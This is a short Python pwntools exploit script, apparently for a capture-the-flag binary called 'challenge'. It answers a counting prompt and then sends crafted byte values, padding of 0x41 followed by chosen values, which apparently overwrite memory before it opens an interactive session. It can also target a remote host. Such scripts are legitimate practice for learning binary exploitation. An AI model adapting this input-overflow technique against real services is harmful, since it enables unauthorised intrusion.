#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('challenge')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *menu+233
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    io.sendlineafter(b"counting?", b"56")
    
    for i in range(36):
        io.sendline(str(0x41).encode())

    io.sendline(str(0x39).encode())

    for j in range(7):
        io.sendline(str(0).encode())

    io.sendline(str(0x2c).encode())

    for j in range(3):
            io.sendline(str(0).encode())

    for k in range(8):
        io.sendline(str(0x41).encode())

    io.sendline(str(0x4b).encode())
    
    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

